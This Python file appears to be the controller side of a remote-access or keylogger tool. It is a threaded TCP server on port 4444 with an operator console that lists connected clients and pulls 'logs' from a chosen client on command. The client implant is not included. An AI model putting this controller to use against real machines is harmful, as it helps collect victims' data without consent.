import threading
import random
import string
import socket
import time
import json
import sys
import os

class Server111(object):
    clients = {}
    client_sequence = 0
    client_responses = {}
    request_ids = {}
    ping_sequences = {}
    sock: socket.socket = None

    def __init__(self, host: str, port: int, timeout: int = 10):
        self.host = host
        self.port = port
        self.timeout = timeout
    
    def start(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock = sock
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.host, self.port))
        sock.listen()

        while True:
            client_sock, client_address = sock.accept()
            threading.Thread(target=self.client_handler, args=[client_sock], daemon=True).start()
    
    def client_handler(self, client_sock: socket.socket):
        client_id = self.client_sequence
        self.client_sequence += 1
        self.clients[client_id] = client_sock
        client_sock.settimeout(self.timeout)

        try:
            while True:
                data = b""

                while True:
                    chunk = client_sock.recv(1)

                    if not chunk:
                        raise Exception("Connection closed.")

                    data += chunk

                    if data.endswith(b"\r\n\r\n"):
                        break
                
                self.on_data(client_sock=client_sock, data=json.loads(data))
        except Exception:
            del self.clients[client_id]
            client_sock.close()
    
    def on_data(self, client_sock: socket.socket, data: dict):
        if not "op" in data:
            raise Exception("Invalid data")

        match data["op"]:
            case "PING":
                if not "sequence" in data:
                    raise Exception("Invalid ping data.")
                
                sequence = int(data["sequence"])

                if not client_sock in self.ping_sequences:
                    if not sequence == 0:
                        raise Exception("Invalid ping sequence.")
                    
                    self.ping_sequences[client_sock] = sequence
                else:
                    last_sequence = self.ping_sequences[client_sock]

                    if not (last_sequence + 1) == sequence:
                        raise Exception("Invalid ping sequence.")
                    
                    self.ping_sequences[client_sock] += 1

                self.pong_client(client_sock=client_sock, sequence=sequence)

            case "RESPONSE":
                if not "request_id" in data:
                    raise Exception("Invalid response data.")
                
                request_id = data["request_id"]

                if not request_id in self.request_ids:
                    raise Exception("Invalid request ID.")
                
                expected_client = self.request_ids[request_id]

                if not client_sock == expected_client:
                    raise Exception("Invalid response sender. Expected it from other client.")
                
                del self.request_ids[request_id]
                self.client_responses[request_id] = data
    
    def pong_client(self, client_sock: socket.socket, sequence: int):
        return self.client_send(client_sock=client_sock, data={"op": "PONG", "sequence": sequence})
    
    def client_send(self, client_sock: socket.socket, data: dict):
        return client_sock.send(json.dumps(data).encode() + b"\r\n\r\n")

    def client_request(self, client_sock: socket.socket, data: dict):
        request_id = "".join(random.choices(string.ascii_letters + string.digits, k=20))
        self.request_ids[request_id] = client_sock

        data["request_id"] = request_id
        self.client_send(client_sock=client_sock, data=data)

        listen_start = time.time()
        while True:
            time.sleep(0.01)
            
            if (time.time() - listen_start) > self.timeout:
                return "Timed out."
            
            if not client_sock in [self.clients[client_id] for client_id in self.clients]:
                return "Client disconnected."
            
            if not request_id in self.client_responses:
                continue

            response = self.client_responses[request_id]
            del self.client_responses[request_id]

            return response
    
    def execute_command(self, command: str, parameters: list):
        output = ""

        match command.lower():
            case "help":
                with open("help.txt", "r") as file:
                    output = file.read()
                    file.close()

            case "clients":
                if self.clients:
                    output = "ID   Address\n"

                    for client_id in self.clients:
                        client_sock = self.clients[client_id]
                        client_host, client_port = client_sock.getpeername()

                        output += f"{client_id}{' ' * (5 - len(str(client_id)))}{client_host}:{client_port}\n"
                else:
                    output = "No clients are currently connected to the server."
            
            case "logs":
                if len(parameters) < 1:
                    return "USAGE: logs [CLIENT ID]"
                
                try:
                    client_id = int(parameters[0])
                except Exception:
                    return "ERROR: Invalid client ID."

                if not client_id in self.clients:
                    return "ERROR: This client does not exist. Execute \"clients\" to show client ID's."
                
                client_sock = self.clients[client_id]

                response = self.client_request(client_sock=client_sock, data={"op": "COMMAND", "command": "logs"})

                if not "response" in response:
                    return "ERROR: Unable to get response."
                
                response = response["response"]

                if type(response) == list:
                    for filename in response:
                        output += filename
                else:
                    output = response

        return output

class Color:
    RED = "\u001b[31;1m"
    GREEN = "\u001b[32;1m"
    YELLOW = "\u001b[33;1m"
    BLUE = "\u001b[34;1m"
    PURPLE = "\u001b[35;1m"
    CYAN = "\u001b[36;1m"
    RESET = "\u001b[0;0m"

def get_banner():
    with open("banner.txt", "r") as file:
        banner = file.read()
        file.close()
    
    return banner

def clear_console():
    if sys.platform == "win32":
        os.system("cls")
    elif sys.platform in ["linux", "linux2"]:
        os.system("clear")

def main():
    clear_console()
    print(f"{Color.RED}{get_banner()}{Color.RESET}\n")

    print(f"Initializing server...")
    time.sleep(1)

    server111 = Server111(host="0.0.0.0", port=4444, timeout=10)
    threading.Thread(target=server111.start, daemon=True).start()

    print(f"Server has initialized. Type \"help\" to show commands.\n")

    while True:
        query = input(">")

        try:
            command, parameters = query.split(" ", 1)
            parameters = parameters.split(" ")
        except Exception:
            command = query
            parameters = []

        output = server111.execute_command(command=command, parameters=parameters)
        print(f"{output}".strip() + "\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        exit()
